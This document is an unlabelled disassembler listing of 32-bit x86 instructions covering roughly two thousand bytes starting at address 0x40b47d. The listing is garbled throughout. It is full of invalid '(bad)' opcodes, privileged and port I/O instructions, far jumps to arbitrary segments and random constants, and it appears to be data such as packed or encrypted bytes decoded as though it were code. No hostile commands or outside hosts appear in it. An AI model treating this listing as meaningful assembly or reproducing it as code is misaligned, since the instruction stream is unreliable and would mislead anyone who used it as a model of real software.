  40b47d:	add    dh,ch
  40b47f:	dec    edx
  40b480:	sbb    eax,0x134b5024
  40b485:	popa   
  40b486:	fdiv   st,st(7)
  40b488:	adc    eax,DWORD PTR [esi-0x61]
  40b48b:	cmp    edi,0xab82c8ac
  40b491:	dec    ecx
  40b492:	into   
  40b493:	scas   al,BYTE PTR es:[edi]
  40b494:	cli    
  40b495:	stos   DWORD PTR es:[edi],eax
  40b496:	adc    dl,BYTE PTR [ebp+ebp*4+0x50bfc4b4]
  40b49d:	(bad)  
  40b49e:	ret    0x8841
  40b4a1:	cmc    
  40b4a2:	pop    es
  40b4a3:	pop    esp
  40b4a4:	iret   
  40b4a5:	out    0x2c,eax
  40b4a7:	or     dh,BYTE PTR [edi+0x71381597]
  40b4ad:	add    DWORD PTR [esi+0x6ae0799d],ecx
  40b4b3:	cmp    cl,BYTE PTR [ebx-0x2e97a0b]
  40b4b9:	xchg   ebx,eax
  40b4ba:	dec    esi
  40b4bb:	jmp    0xc14e:0x49eec85a
  40b4c2:	lea    edi,[ebx]
  40b4c4:	test   BYTE PTR [ebp-0x1c9b681d],al
  40b4ca:	jle    0x40b4d1
  40b4cc:	jg     0x40b47d
  40b4ce:	sub    eax,0x157bb811
  40b4d3:	xchg   ebx,eax
  40b4d4:	push   0x742dd76e
  40b4d9:	xor    ebx,DWORD PTR [ecx-0x7b]
  40b4dc:	jmp    0xfb3:0x6cc2b764
  40b4e3:	sbb    al,0x4d
  40b4e5:	mul    BYTE PTR [edx-0x77]
  40b4e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b4e9:	call   0x7b15f512
  40b4ee:	sbb    esi,DWORD PTR [edx]
  40b4f0:	cmp    BYTE PTR [ebx+0x28e07d58],ch
  40b4f6:	fs int 0xf4
  40b4f9:	mov    bh,0x6c
  40b4fb:	add    eax,DWORD PTR [ebp-0x2fea2db9]
  40b501:	test   DWORD PTR [eax+0xd6c31ad],ecx
  40b507:	push   eax
  40b508:	out    dx,eax
  40b509:	stos   DWORD PTR es:[edi],eax
  40b50a:	mov    edx,DWORD PTR [esi]
  40b50c:	adc    ecx,DWORD PTR [ebp-0x2787da95]
  40b512:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b513:	fld    TBYTE PTR [ebx]
  40b515:	fwait
  40b516:	xchg   edx,eax
  40b517:	xchg   ecx,eax
  40b518:	xor    bl,BYTE PTR [ebp+eax*4+0x18252a63]
  40b51f:	mov    cl,BYTE PTR [ebp-0x6f]
  40b522:	pushf  
  40b523:	rcr    DWORD PTR [ebx+0x19a8fd58],0xed
  40b52a:	dec    esp
  40b52b:	xor    ch,BYTE PTR ss:0x62f5caaa
  40b532:	and    DWORD PTR [edx+0x432564b6],esp
  40b538:	(bad)  
  40b53a:	int3   
  40b53b:	adc    al,0x6a
  40b53d:	mov    eax,ds:0xe91758c6
  40b542:	jae    0x40b5ba
  40b544:	inc    edx
  40b545:	fistp  QWORD PTR gs:[esi-0x5bc540c0]
  40b54c:	pop    edi
  40b54d:	out    0xec,eax
  40b54f:	adc    DWORD PTR [ebp-0x1e],esi
  40b552:	lahf   
  40b553:	xchg   BYTE PTR [ebx],cl
  40b555:	mov    al,0x1c
  40b557:	adc    ebp,DWORD PTR [edi+0x28910bad]
  40b55d:	adc    eax,0xf2c1e8fa
  40b562:	mov    al,0xd0
  40b564:	lods   al,BYTE PTR ds:[esi]
  40b565:	push   esp
  40b566:	aam    0xd9
  40b568:	and    eax,0x54da24a7
  40b56d:	cdq    
  40b56e:	ins    DWORD PTR es:[edi],dx
  40b56f:	xchg   esp,eax
  40b570:	test   DWORD PTR [ecx-0x4b],esi
  40b573:	jns    0x40b5b1
  40b575:	mov    dl,0x9b
  40b577:	add    ah,BYTE PTR [esi-0x5a6d1370]
  40b57d:	dec    ebx
  40b57e:	mov    eax,ds:0xdf45d0e6
  40b583:	pop    esi
  40b584:	jp     0x40b52b
  40b586:	outs   dx,DWORD PTR ds:[esi]
  40b587:	and    eax,0xeae6da49
  40b58c:	in     eax,0x35
  40b58e:	add    dh,BYTE PTR [edx]
  40b590:	daa    
  40b591:	ja     0x40b52e
  40b593:	add    BYTE PTR [esi+0x5f6fa6ab],0x30
  40b59a:	mov    DWORD PTR [esi],0x7387f737
  40b5a0:	(bad)  
  40b5a1:	clc    
  40b5a2:	cmp    BYTE PTR [edx+0x4b3cb4d8],dh
  40b5a8:	xlat   BYTE PTR ds:[ebx]
  40b5a9:	adc    BYTE PTR [edx+0x2e],al
  40b5ac:	mov    eax,ds:0x98d42013
  40b5b1:	push   edi
  40b5b2:	pop    es
  40b5b3:	and    eax,0x104ef3f
  40b5b8:	call   0x8ab6:0xa132a5b6
  40b5bf:	or     al,0x8
  40b5c1:	inc    ecx
  40b5c2:	retf   0x4f3c
  40b5c5:	inc    ebp
  40b5c6:	daa    
  40b5c7:	stc    
  40b5c8:	mov    eax,0x234d899f
  40b5cd:	lods   al,BYTE PTR ds:[esi]
  40b5ce:	jb     0x40b63d
  40b5d0:	arpl   WORD PTR [edx],bp
  40b5d2:	seta   BYTE PTR [edx-0x7c]
  40b5d6:	es and dl,al
  40b5d9:	ss pop ss
  40b5db:	pop    es
  40b5dc:	shl    BYTE PTR gs:0x38207000,0x92
  40b5e4:	call   0xbfbedf37
  40b5e9:	cmc    
  40b5ea:	xlat   BYTE PTR ds:[ebx]
  40b5eb:	shl    DWORD PTR [eax-0x26aa0ee6],cl
  40b5f1:	add    al,0xc9
  40b5f3:	inc    ecx
  40b5f4:	add    esp,DWORD PTR [edi+0x44b33491]
  40b5fa:	leave  
  40b5fb:	and    DWORD PTR [edx+esi*2],edi
  40b5fe:	enter  0xacdf,0xc9
  40b602:	sbb    DWORD PTR ds:0x26b5eee,ecx
  40b608:	imul   eax,DWORD PTR [ecx+0x3160225b],0x1fbf669a
  40b612:	pop    ss
  40b613:	adc    BYTE PTR [edi+0x2dd7146f],bl
  40b619:	call   FWORD PTR [ebp-0x4c9dc55c]
  40b61f:	and    edi,DWORD PTR [ebx]
  40b621:	adc    al,0x6b
  40b623:	jge    0x40b688
  40b625:	adc    al,0xc6
  40b627:	sbb    BYTE PTR [edi+0xf1c652e],al
  40b62d:	aam    0x7c
  40b62f:	scas   eax,DWORD PTR es:[edi]
  40b630:	and    BYTE PTR [eax+0x7a9bc8c8],bh
  40b636:	jg     0x40b6a2
  40b638:	jmp    0x5af5:0xf877af66
  40b63f:	jo     0x40b5ca
  40b641:	das    
  40b642:	retf   0xc09e
  40b645:	cmp    al,ah
  40b647:	fld    DWORD PTR [eax+esi*4+0x4d]
  40b64b:	gs call 0x8d9d:0x6797d28c
  40b653:	cmp    al,0x48
  40b655:	jle    0x40b690
  40b657:	jl     0x40b6cb
  40b659:	sub    al,dl
  40b65b:	shr    BYTE PTR [ebp+ebx*2+0x78],cl
  40b65f:	cdq    
  40b660:	mov    ecx,0x6681424c
  40b665:	(bad)  
  40b666:	leave  
  40b667:	das    
  40b668:	mov    esi,DWORD PTR [edx+0x77631632]
  40b66e:	xchg   esp,eax
  40b66f:	lods   eax,DWORD PTR ds:[esi]
  40b670:	xchg   ebx,eax
  40b671:	(bad)  
  40b672:	sub    ecx,ecx
  40b674:	add    ebp,DWORD PTR [ecx-0x51]
  40b677:	sbb    eax,0xcff075b5
  40b67c:	push   ss
  40b67d:	stc    
  40b67e:	int    0x3a
  40b680:	retf   0x7128
  40b683:	and    eax,0x1514be82
  40b688:	stos   BYTE PTR es:[edi],al
  40b689:	ins    DWORD PTR es:[edi],dx
  40b68a:	outs   dx,DWORD PTR ds:[esi]
  40b68b:	retf   0x6616
  40b68e:	ret    0x340d
  40b691:	in     eax,dx
  40b692:	and    DWORD PTR [ebx],0x32d2bfb2
  40b698:	inc    esp
  40b699:	cs xor bh,cl
  40b69c:	xchg   esp,eax
  40b69d:	pop    ds
  40b69e:	mov    dl,0xe8
  40b6a0:	(bad)  
  40b6a1:	adc    ah,al
  40b6a3:	outs   dx,BYTE PTR ds:[esi]
  40b6a4:	je     0x40b6dd
  40b6a6:	pop    ds
  40b6a7:	shl    eax,0x37
  40b6aa:	test   BYTE PTR [ecx],bh
  40b6ac:	cmc    
  40b6ad:	test   al,dl
  40b6af:	test   DWORD PTR [esi+eax*1],esi
  40b6b2:	out    0x3b,eax
  40b6b4:	and    al,BYTE PTR [edi+ebx*8+0x1967bb5]
  40b6bb:	les    esi,FWORD PTR [esi-0x1292360b]
  40b6c1:	outs   dx,DWORD PTR ds:[esi]
  40b6c2:	sbb    al,0x1d
  40b6c4:	pop    ss
  40b6c5:	push   edx
  40b6c6:	pop    ss
  40b6c7:	call   0x78df:0xff17e7ce
  40b6ce:	inc    edi
  40b6cf:	int    0x29
  40b6d1:	scas   eax,DWORD PTR es:[edi]
  40b6d2:	mov    eax,0xcfb359f7
  40b6d7:	and    BYTE PTR [eax-0x70],0x5e
  40b6db:	and    ebx,DWORD PTR [edi+0x2a2c35f7]
  40b6e1:	inc    esi
  40b6e2:	lods   eax,DWORD PTR ds:[esi]
  40b6e3:	popa   
  40b6e4:	nop
  40b6e5:	pop    ss
  40b6e6:	push   esp
  40b6e7:	and    esp,ecx
  40b6e9:	mov    dh,BYTE PTR [ebp+0x7e]
  40b6ec:	mov    dl,0x53
  40b6ee:	daa    
  40b6ef:	dec    esi
  40b6f0:	jmp    0x27bb04f2
  40b6f5:	or     al,0x4
  40b6f7:	mov    ebx,0xd670fe3c
  40b6fc:	pop    ecx
  40b6fd:	shl    DWORD PTR [esi+0x6514bd1b],cl
  40b703:	shl    DWORD PTR [ecx-0x6],0x97
  40b707:	cmp    DWORD PTR [ecx+0x33],eax
  40b70a:	lods   eax,DWORD PTR ds:[esi]
  40b70b:	lahf   
  40b70c:	push   ebp
  40b70d:	push   edx
  40b70e:	jge    0x40b708
  40b710:	xor    DWORD PTR ds:0x1f4932f2,0x69
  40b717:	push   ds
  40b718:	mov    edx,0xf3d24470
  40b71d:	call   0x9253:0x3e2279e9
  40b724:	arpl   WORD PTR ds:0x6d1a,ax
  40b729:	ins    DWORD PTR es:[edi],dx
  40b72a:	addr16 jg 0x40b6c8
  40b72d:	test   ebp,ecx
  40b72f:	dec    esp
  40b730:	add    DWORD PTR ss:[esi+edi*8-0x4079bd2f],esi
  40b738:	in     al,dx
  40b739:	test   DWORD PTR [edx+0x65],ebp
  40b73c:	mov    esi,0x6e624cee
  40b741:	lock cmp esi,0x7bb0593
  40b748:	pop    ds
  40b749:	lods   al,BYTE PTR ds:[esi]
  40b74a:	push   0xffffffdb
  40b74c:	scas   al,BYTE PTR es:[edi]
  40b74d:	or     esp,DWORD PTR [ecx+0x21]
  40b750:	xor    DWORD PTR [ebx+ecx*8],eax
  40b753:	dec    edi
  40b754:	mov    dl,0x60
  40b756:	int3   
  40b757:	jge    0x40b73a
  40b759:	imul   BYTE PTR [esi+0x23]
  40b75c:	mov    eax,0xa9a46839
  40b761:	scas   eax,DWORD PTR es:[edi]
  40b762:	inc    edi
  40b763:	cmc    
  40b764:	ret    0xd403
  40b767:	test   al,0x31
  40b769:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b76a:	outs   dx,BYTE PTR ds:[esi]
  40b76b:	aas    
  40b76c:	push   es
  40b76d:	test   al,0xa5
  40b76f:	sti    
  40b770:	xchg   edi,eax
  40b771:	loop   0x40b793
  40b773:	(bad)  
  40b774:	sbb    eax,DWORD PTR [ecx+edi*2-0x2dd0c47]
  40b77b:	dec    edx
  40b77c:	pop    eax
  40b77d:	out    dx,eax
  40b77e:	mov    dl,0xb2
  40b780:	add    al,0xe5
  40b782:	cs jns 0x40b802
  40b785:	cmp    ecx,DWORD PTR [esi-0x7e9f7e79]
  40b78b:	ds es jno 0x40b775
  40b78f:	inc    ecx
  40b790:	jo     0x40b780
  40b792:	sbb    esp,esi
  40b794:	sbb    BYTE PTR [esi],dh
  40b796:	(bad)  
  40b797:	mov    ebx,0x197e9b1e
  40b79c:	repz sbb al,0x94
  40b79f:	in     eax,dx
  40b7a0:	out    0x9d,eax
  40b7a2:	mov    DWORD PTR [eax+0xa],ecx
  40b7a5:	ins    DWORD PTR es:[edi],dx
  40b7a6:	xor    DWORD PTR [ebx],ebx
  40b7a8:	sbb    bl,BYTE PTR fs:[edi+0x5bed5e94]
  40b7af:	xchg   esi,eax
  40b7b0:	push   eax
  40b7b1:	leave  
  40b7b2:	jne    0x40b7d4
  40b7b4:	outs   dx,DWORD PTR ds:[esi]
  40b7b5:	inc    ebx
  40b7b6:	retf   0x817f
  40b7b9:	mov    bh,0x98
  40b7bb:	sub    dl,ah
  40b7bd:	iret   
  40b7be:	clc    
  40b7bf:	mov    WORD PTR [esi+eiz*1+0x7ec040c5],fs
  40b7c6:	outs   dx,BYTE PTR ds:[esi]
  40b7c7:	addr16 imul esi,esi,0x27
  40b7cb:	mov    ebp,DWORD PTR [edi-0x3c75f492]
  40b7d1:	pusha  
  40b7d2:	xchg   ebp,eax
  40b7d3:	jl     0x40b779
  40b7d5:	jnp    0x40b773
  40b7d7:	and    al,0xb0
  40b7d9:	push   0x59
  40b7db:	xchg   ebp,eax
  40b7dc:	repnz stos BYTE PTR es:[edi],al
  40b7de:	mov    ah,0x35
  40b7e0:	in     al,0x21
  40b7e2:	data16 mov bh,0x32
  40b7e5:	lods   al,BYTE PTR ds:[esi]
  40b7e6:	and    edx,DWORD PTR [edx+0x59]
  40b7e9:	inc    esp
  40b7ea:	cs fdivr DWORD PTR cs:[edx+0x5b]
  40b7ef:	bnd jo 0x40b7d9
  40b7f2:	imul   ecx,DWORD PTR [ebp-0x769ffd1c],0xf9e13f30
  40b7fc:	enter  0x5441,0x18
  40b800:	add    BYTE PTR [esi],bl
  40b802:	mov    al,ds:0xd999dd98
  40b807:	stc    
  40b808:	xchg   esp,eax
  40b809:	jmp    0xb83b11f7
  40b80e:	xor    eax,0x1abc4e62
  40b813:	retf   
  40b814:	repnz inc ebp
  40b816:	outs   dx,BYTE PTR ds:[esi]
  40b817:	hlt    
  40b818:	ins    BYTE PTR es:[edi],dx
  40b819:	push   ss
  40b81a:	sub    eax,0xf45f848c
  40b81f:	jno    0x40b7d8
  40b821:	pop    ebp
  40b822:	cmp    al,0xf8
  40b824:	fnsave [esi-0x2e]
  40b827:	mov    dh,0x42
  40b829:	sar    BYTE PTR [ecx-0x17e935f],1
  40b82f:	mov    bh,0xba
  40b831:	cmc    
  40b832:	shl    BYTE PTR [edx+0x18],cl
  40b835:	pop    es
  40b836:	add    al,0x73
  40b838:	sub    DWORD PTR [esi],0x3015d3d9
  40b83e:	xchg   ecx,eax
  40b83f:	inc    ebp
  40b840:	inc    edi
  40b841:	sahf   
  40b842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b843:	ret    0x509d
  40b846:	dec    esi
  40b847:	push   esp
  40b848:	push   0x1c
  40b84a:	outs   dx,BYTE PTR ds:[esi]
  40b84b:	mov    ebx,0x8cb79220
  40b850:	mov    esi,0x128e5eca
  40b855:	add    DWORD PTR ss:[esi-0x24187dfc],esi
  40b85c:	adc    eax,edi
  40b85e:	jl     0x40b87c
  40b860:	adc    DWORD PTR [ecx],edi
  40b862:	pop    edx
  40b863:	xchg   ecx,eax
  40b864:	pushf  
  40b865:	(bad)  
  40b866:	call   0xcf80:0x1b28fdb1
  40b86d:	fdiv   st,st(2)
  40b86f:	scas   eax,DWORD PTR es:[edi]
  40b870:	popa   
  40b871:	sti    
  40b872:	sbb    cl,BYTE PTR [edi-0x3762c7df]
  40b878:	mov    dl,BYTE PTR [esi]
  40b87a:	rcl    DWORD PTR [ebx-0x4a],1
  40b87d:	(bad)  
  40b87e:	imul   edx,DWORD PTR [eax],0x74
  40b881:	cli    
  40b882:	cmp    ebx,esi
  40b884:	mov    ecx,0x5e81022a
  40b889:	out    0x1,eax
  40b88b:	out    dx,eax
  40b88c:	das    
  40b88d:	mov    al,0x1e
  40b88f:	out    dx,eax
  40b890:	lods   eax,DWORD PTR ds:[esi]
  40b891:	xchg   ebp,eax
  40b892:	mov    WORD PTR [edi-0x73],fs
  40b895:	nop
  40b896:	cs xchg edx,eax
  40b898:	ficom  WORD PTR [edi]
  40b89a:	lock xchg ecx,eax
  40b89c:	and    bh,bl
  40b89e:	add    DWORD PTR [eax+0x1],ecx
  40b8a1:	push   0x15
  40b8a3:	and    eax,0x7b675556
  40b8a8:	popf   
  40b8a9:	loop   0x40b8af
  40b8ab:	dec    ecx
  40b8ac:	cdq    
  40b8ad:	das    
  40b8ae:	loopne 0x40b84e
  40b8b0:	das    
  40b8b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8b2:	inc    ebx
  40b8b3:	mov    bh,0x2b
  40b8b5:	push   0xe35a1bd9
  40b8ba:	std    
  40b8bb:	adc    eax,0x3a29473
  40b8c0:	jb     0x40b89e
  40b8c2:	scas   al,BYTE PTR es:[edi]
  40b8c3:	addr16 gs xchg al,dh
  40b8c7:	push   0xbcccb64
  40b8cc:	inc    eax
  40b8cd:	(bad)  
  40b8ce:	(bad)  
  40b8cf:	into   
  40b8d0:	les    edi,FWORD PTR [esi-0x7a]
  40b8d3:	fstp   TBYTE PTR [edx+0x49a14f12]
  40b8d9:	ins    BYTE PTR es:[edi],dx
  40b8da:	or     eax,0xb824fff4
  40b8df:	sahf   
  40b8e0:	jb     0x40b940
  40b8e2:	imul   esi,DWORD PTR [esi+0x34],0x56c58ef7
  40b8e9:	loopne 0x40b8c4
  40b8eb:	cdq    
  40b8ec:	rcr    dh,1
  40b8ee:	shl    DWORD PTR [edi],0xb0
  40b8f1:	mov    ds:0x11da1c2f,al
  40b8f6:	xchg   ecx,eax
  40b8f7:	mov    eax,0xcff9a098
  40b8fc:	cdq    
  40b8fd:	push   0xfffffff2
  40b8ff:	or     DWORD PTR [eax],0x511e38c9
  40b905:	jmp    0x40b896
  40b907:	or     ebp,DWORD PTR es:[eax+0x6b9c9f00]
  40b90e:	lock out 0x28,eax
  40b911:	push   0xda2fde5a
  40b916:	or     eax,0x18651db2
  40b91b:	add    ebx,DWORD PTR [eax-0x5b]
  40b91e:	push   ss
  40b91f:	jp     0x40b966
  40b921:	mov    ah,0xa3
  40b923:	sub    al,bl
  40b925:	inc    ecx
  40b926:	sahf   
  40b927:	jno    0x40b92c
  40b929:	imul   edx,DWORD PTR [eax-0x6a],0x75
  40b92d:	arpl   bx,dx
  40b92f:	std    
  40b930:	mov    al,0x67
  40b932:	leave  
  40b933:	(bad)  
  40b934:	mov    ebp,0x7aae21a3
  40b939:	mov    cl,BYTE PTR [esp+ebx*1+0x6835ea93]
  40b940:	xchg   DWORD PTR [ecx+ebp*4+0x12],ebx
  40b944:	sar    DWORD PTR [ecx],1
  40b946:	data16 cmc 
  40b948:	dec    edi
  40b949:	mov    ebx,0x11012026
  40b94e:	fs in  eax,dx
  40b950:	push   cs
  40b951:	push   ebx
  40b952:	dec    ebp
  40b953:	add    dl,BYTE PTR [edx+eiz*2+0x7c]
  40b957:	iret   
  40b958:	push   edx
  40b959:	push   esp
  40b95a:	push   cs
  40b95b:	mov    ecx,0xb539d138
  40b960:	and    eax,0x705acb39
  40b965:	test   BYTE PTR [eax+0x4d],0xd5
  40b969:	or     al,0xf6
  40b96b:	add    cl,dl
  40b96d:	cmp    edi,DWORD PTR [ebx+ecx*4+0x25a93324]
  40b974:	push   0x0
  40b976:	std    
  40b977:	pusha  
  40b978:	sub    al,0xec
  40b97a:	pushf  
  40b97b:	add    BYTE PTR [edx-0x354192b6],bl
  40b981:	ret    0x6db5
  40b984:	xchg   ebx,eax
  40b985:	push   esp
  40b986:	mov    eax,0x7cd8507f
  40b98b:	dec    ecx
  40b98c:	retf   0x6bd6
  40b98f:	call   0xd24f:0xc59cc3f5
  40b996:	addr16 jns 0x40b953
  40b999:	and    ecx,eax
  40b99b:	bound  ebx,QWORD PTR [edx-0x5e]
  40b99e:	imul   edi,edx,0x1a84abc3
  40b9a4:	into   
  40b9a5:	sub    cl,BYTE PTR [ecx]
  40b9a7:	sahf   
  40b9a8:	pop    eax
  40b9a9:	mov    bh,0x35
  40b9ab:	icebp  
  40b9ac:	enter  0x61fd,0xad
  40b9b0:	fbstp  TBYTE PTR [ebx-0x6c]
  40b9b3:	dec    esp
  40b9b4:	data16 adc ch,BYTE PTR [edx-0xb]
  40b9b8:	jp     0x40b9c5
  40b9ba:	imul   esp,DWORD PTR [edx-0x4cc84e72],0xe6119e1b
  40b9c4:	mov    cl,BYTE PTR [edi-0x4a]
  40b9c7:	gs jne 0x40b984
  40b9ca:	jae    0x40ba25
  40b9cc:	cld    
  40b9cd:	enter  0x82a,0xc7
  40b9d1:	stc    
  40b9d2:	mov    cl,0x92
  40b9d4:	mov    ?,WORD PTR [esi+0x6a]
  40b9d7:	adc    eax,0x4b89f20c
  40b9dc:	xor    bl,BYTE PTR [edx]
  40b9de:	int    0xab
  40b9e0:	and    eax,0x94924ccc
  40b9e5:	cmp    al,0xad
  40b9e7:	xchg   DWORD PTR [edi+0x678746f0],eax
  40b9ed:	mov    ebp,0x238cf24d
  40b9f2:	xchg   edi,eax
  40b9f3:	xchg   ebp,eax
  40b9f4:	ins    BYTE PTR es:[edi],dx
  40b9f5:	sbb    ah,BYTE PTR [ebp+0x481e1956]
  40b9fb:	std    
  40b9fc:	pop    edi
  40b9fd:	or     DWORD PTR [ebp+0x47f36408],edx
  40ba03:	or     eax,0xa9c63ebc
  40ba08:	mov    DWORD PTR [ecx-0x37],eax
  40ba0b:	mov    al,0xb6
  40ba0d:	mov    BYTE PTR [ebx],0xa1
  40ba10:	and    eax,0x5ede5127
  40ba15:	retf   
  40ba16:	dec    ebp
  40ba17:	iret   
  40ba18:	fild   WORD PTR [ecx+ebx*2+0x19bdc766]
  40ba1f:	scas   al,BYTE PTR es:[edi]
  40ba20:	in     eax,0x3d
  40ba22:	sahf   
  40ba23:	ja     0x40ba55
  40ba25:	jnp    0x40ba3a
  40ba27:	lds    ebx,FWORD PTR [edi+eax*4-0x7ea3bed3]
  40ba2e:	scas   eax,DWORD PTR es:[edi]
  40ba2f:	mov    edi,0x25cfcedf
  40ba34:	jno    0x40ba01
  40ba36:	push   ebx
  40ba37:	fwait
  40ba38:	repz imul BYTE PTR [edi-0x7d90576c]
  40ba3f:	push   es
  40ba40:	clc    
  40ba41:	and    dh,BYTE PTR [edx-0x56]
  40ba44:	outs   dx,BYTE PTR ds:[esi]
  40ba45:	or     eax,0x8b9a20f2
  40ba4a:	sbb    edi,DWORD PTR [ebp-0x13]
  40ba4d:	js     0x40b9d3
  40ba4f:	xor    eax,DWORD PTR [edi+0x1a1f62fa]
  40ba55:	test   eax,0xe0c732e
  40ba5a:	(bad)
  40ba5e:	dec    esi
  40ba5f:	dec    ecx
  40ba60:	xor    eax,0xce0ef0be
  40ba65:	ins    BYTE PTR es:[edi],dx
  40ba66:	ds push cs
  40ba68:	mov    edx,0xe7250b7c
  40ba6d:	leave  
  40ba6e:	fisttp DWORD PTR [eax+0x7acf6837]
  40ba74:	jns    0x40ba18
  40ba76:	shl    DWORD PTR [ecx+eiz*4-0x1de6abce],0xd5
  40ba7e:	or     al,BYTE PTR [edx]
  40ba80:	mov    dl,0xbf
  40ba82:	loop   0x40bad7
  40ba84:	int    0x3c
  40ba86:	mov    BYTE PTR [eax+0x33ee57f7],0x80
  40ba8d:	xor    edi,edx
  40ba8f:	and    eax,0x1ea2abef
  40ba94:	leave  
  40ba95:	cmp    BYTE PTR [esi+0x52],dh
  40ba98:	dec    ebx
  40ba99:	add    eax,0xac0648b0
  40ba9e:	out    dx,eax
  40ba9f:	hlt    
  40baa0:	nop
  40baa1:	xchg   BYTE PTR ds:0x9c622060,dh
  40baa7:	mov    esi,0xe983accf
  40baac:	(bad)  
  40baad:	pushf  
  40baae:	sbb    BYTE PTR [ebx+0x78],cl
  40bab1:	mov    bh,0xea
  40bab3:	outs   dx,DWORD PTR ds:[esi]
  40bab4:	fwait
  40bab5:	std    
  40bab6:	inc    ebx
  40bab7:	and    al,dl
  40bab9:	push   DWORD PTR [esi]
  40babb:	mov    ebp,0x1044f919
  40bac0:	loope  0x40bad1
  40bac2:	retf   
  40bac3:	stos   DWORD PTR es:[edi],eax
  40bac4:	push   cs
  40bac5:	push   ebp
  40bac6:	mov    ebp,0x77b28695
  40bacb:	test   BYTE PTR [esi],ah
  40bacd:	mov    edi,0x931b064c
  40bad2:	mov    ah,0xe
  40bad4:	popa   
  40bad5:	enter  0xf6d0,0xae
  40bad9:	cmp    cl,bl
  40badb:	sbb    al,0x8e
  40badd:	adc    BYTE PTR [ecx],ch
  40badf:	aaa    
  40bae0:	test   al,0x64
  40bae2:	dec    esp
  40bae3:	daa    
  40bae4:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40bae6:	sti    
  40bae7:	push   0x50d3a82e
  40baec:	repnz adc BYTE PTR [ecx-0x15578c40],dh
  40baf3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baf4:	hlt    
  40baf5:	test   BYTE PTR [edi],dh
  40baf7:	icebp  
  40baf8:	sbb    BYTE PTR cs:[ecx-0x1dcc35f],dh
  40baff:	popa   
  40bb00:	adc    ch,BYTE PTR [esi+0x1d6380f4]
  40bb06:	sbb    DWORD PTR [ebp-0x70],edi
  40bb09:	cmp    eax,0x6d2b6357
  40bb0e:	and    dh,BYTE PTR [ecx]
  40bb10:	pop    esi
  40bb11:	jb     0x40baa1
  40bb13:	cmp    DWORD PTR [ecx],ebp
  40bb15:	lock scas eax,DWORD PTR es:[edi]
  40bb17:	jecxz  0x40bae9
  40bb19:	xor    eax,0xab17308c
  40bb1e:	in     al,0xeb
  40bb20:	outs   dx,DWORD PTR ds:[esi]
  40bb21:	mov    al,ds:0x1eeaa31a
  40bb26:	aad    0xc7
  40bb28:	sbb    al,0x84
  40bb2a:	and    BYTE PTR [ecx],ah
  40bb2c:	pusha  
  40bb2d:	jl     0x40bad6
  40bb2f:	inc    bl
  40bb31:	ds pop es
  40bb33:	push   eax
  40bb34:	imul   edx,DWORD PTR [ebx+0x7b45a953],0x8
  40bb3b:	mov    edx,esp
  40bb3d:	cmp    ebx,ebp
  40bb3f:	xor    edx,DWORD PTR [edi+0x6a614145]
  40bb45:	xchg   ebp,eax
  40bb46:	out    0x98,eax
  40bb48:	mov    ds:0xc4e988ae,eax
  40bb4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb4e:	xchg   ecx,eax
  40bb50:	mov    DWORD PTR [ecx+0x20],ebx
  40bb53:	mov    eax,ds:0xf1f8ea27
  40bb58:	(bad)  
  40bb59:	jb     0x40bbd3
  40bb5b:	lahf   
  40bb5c:	std    
  40bb5d:	bound  esi,QWORD PTR [ebx-0x528f8f5c]
  40bb63:	xor    cx,WORD PTR [edi+0x24054714]
  40bb6a:	xlat   BYTE PTR ds:[ebx]
  40bb6b:	xchg   BYTE PTR [ebx],al
  40bb6d:	mov    ecx,0x13a85836
  40bb72:	xchg   esi,eax
  40bb73:	xchg   ebp,eax
  40bb74:	xlat   BYTE PTR ds:[ebx]
  40bb75:	outs   dx,DWORD PTR ds:[esi]
  40bb76:	push   ecx
  40bb77:	bound  ecx,QWORD PTR [edx]
  40bb79:	xchg   esi,eax
  40bb7a:	xlat   BYTE PTR ds:[ebx]
  40bb7b:	xor    al,0x6d
  40bb7d:	int    0x2c
  40bb7f:	inc    edx
  40bb80:	xchg   esi,eax
  40bb81:	pusha  
  40bb82:	inc    esi
  40bb83:	pop    eax
  40bb84:	in     al,dx
  40bb85:	pop    ecx
  40bb86:	call   0x2d52:0x4b42349
  40bb8d:	shl    DWORD PTR [ecx-0x40],0xa7
  40bb91:	fdivr  QWORD PTR [edi]
  40bb93:	xchg   esi,eax
  40bb94:	call   0xd5a9:0xc5ce5cbd
  40bb9b:	mov    esi,DWORD PTR [esi-0x4]
  40bb9e:	push   es
  40bb9f:	jo     0x40bb3e
  40bba1:	or     ch,ch
  40bba3:	sbb    al,0xd0
  40bba5:	fwait
  40bba6:	jo     0x40bb7c
  40bba8:	push   eax
  40bbaa:	(bad)
  40bbad:	push   ss
  40bbae:	lahf   
  40bbaf:	mov    al,ds:0x2cc5d74c
  40bbb4:	sub    eax,0x6624c7de
  40bbb9:	push   esp
  40bbba:	jecxz  0x40bbe1
  40bbbc:	pop    ebp
  40bbbd:	mov    DWORD PTR [edx+0x60e6dfe9],esp
  40bbc3:	dec    edx
  40bbc4:	out    0x88,eax
  40bbc6:	and    edi,DWORD PTR [eax-0x44ed86ef]
  40bbcc:	jnp    0x40bc43
  40bbce:	dec    eax
  40bbcf:	and    eax,edi
  40bbd1:	std    
  40bbd2:	adc    dh,BYTE PTR [eax]
  40bbd4:	cmp    BYTE PTR [ebx],ch
  40bbd6:	popa   
  40bbd7:	mov    dl,0x9c
  40bbd9:	ins    BYTE PTR es:[edi],dx
  40bbda:	add    DWORD PTR [ebx-0x4cb3c773],edx
  40bbe0:	push   ebx
  40bbe1:	add    ebp,DWORD PTR [ecx-0x3c]
  40bbe4:	push   0xecc5d182
  40bbe9:	fwait
  40bbea:	pop    ss
  40bbeb:	ja     0x40bb77
  40bbed:	and    DWORD PTR [edx],0x63
  40bbf0:	mov    ebx,ds
  40bbf2:	icebp  
  40bbf3:	jmp    0x40bc30
  40bbf5:	cmp    ebx,esi
  40bbf7:	in     eax,0x2
  40bbf9:	cmc    
  40bbfa:	ja     0x40bc3a
  40bbfc:	adc    eax,0xdde1cb72
  40bc01:	js     0x40bc1f
  40bc03:	cmc    
  40bc04:	mov    ah,0x56
  40bc06:	or     al,0x92
  40bc08:	push   ebp
  40bc09:	xlat   BYTE PTR ds:[ebx]
